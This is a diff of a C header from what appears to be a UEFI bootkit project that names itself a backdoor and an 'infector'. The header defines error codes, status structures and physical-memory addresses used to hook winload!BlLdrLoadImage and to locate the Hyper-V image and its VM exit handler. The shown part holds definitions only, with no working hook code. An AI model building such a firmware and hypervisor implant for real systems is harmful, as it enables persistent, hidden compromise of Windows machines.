@@ -7,12 +7,16 @@
 // physical address where DXE driver will be loaded
 #define BACKDOOR_ADDR 0x10000
 
+#define BACKDOOR_NOT_READY  0
+#define BACKDOOR_SUCCESS    1
+
 // error codes
-#define BACKDOOR_ERR_WINLOAD                 ((UINT64)-1) // winload.efi not found
-#define BACKDOOR_ERR_BELOW_1MB_NOT_FOUND     ((UINT64)-2) // winload!HvlpBelow1MbPage not found
-#define BACKDOOR_ERR_BELOW_1MB_NOT_ALLOCATED ((UINT64)-3) // winload!HvlpBelow1MbPage not allocated
-#define BACKDOOR_ERR_TRANSFER_TO_HYPERVISOR  ((UINT64)-4) // winload!HvlpTransferToHypervisor() not found
-#define BACKDOOR_ERR_LOW_MEMORY_STUB         ((UINT64)-5) // winload!HvlpLowMemoryStub() not found
+#define BACKDOOR_ERR_UNKNOWN        ((UINT64)-1) // unkown error
+#define BACKDOOR_ERR_WINLOAD_IMAGE  ((UINT64)-2) // winload image not found
+#define BACKDOOR_ERR_WINLOAD_FUNC   ((UINT64)-3) // winload!BlLdrLoadImage() not found
+#define BACKDOOR_ERR_WINLOAD_HOOK   ((UINT64)-4) // winload hook error
+#define BACKDOOR_ERR_HYPER_V_IMAGE  ((UINT64)-5) // Hyper-V image not found
+#define BACKDOOR_ERR_HYPER_V_EXIT   ((UINT64)-6) // Hyper-V VM exit handler not found
 
 #pragma pack(1)
 
@@ -27,32 +31,32 @@ typedef struct _INFECTOR_CONFIG
 
 typedef struct _INFECTOR_STATUS
 {
-    UINT64 Success;
+    UINT64 Status;
     UINT64 Unused;
 
 } INFECTOR_STATUS,
 *PINFECTOR_STATUS;
 
-typedef struct _HV_INFO
+typedef struct _HYPER_V_INFO
 {
-    UINT64 Success;
-    UINT64 WinloadPageTable;
-    UINT64 HvPageTable;
-    UINT64 HvEntry;
-    UINT64 HvVmExit;
+    UINT64 Status;
+    VOID *ImageBase;
+    VOID *ImageEntry;
+    VOID *VmExit;
 
-} HV_INFO,
-*PHV_INFO;
+} HYPER_V_INFO,
+*PHYPER_V_INFO;
 
 #pragma pack()
 
 // physical address of INFECTOR_STATUS
-#define STATUS_ADDR (0x1000 - sizeof(INFECTOR_STATUS))
+#define INFECTOR_STATUS_ADDR (PAGE_SIZE - sizeof(INFECTOR_STATUS))
 
-// physical address of HV_INFO
-#define HV_INFO_ADDR (0x1000 - sizeof(INFECTOR_STATUS) - sizeof(HV_INFO))
+// physical address of HYPER_V_INFO
+#define HYPER_V_INFO_ADDR (INFECTOR_STATUS_ADDR - sizeof(HYPER_V_INFO))
 
-#define MAX_IMAGE_SIZE (1 * 1024 * 1024)
+// debug messages buffer pointer address
+#define DEBUG_OUTPUT_ADDR (HYPER_V_INFO_ADDR - sizeof(UINT64))
 
 void ConsolePrint(char *Message);
 
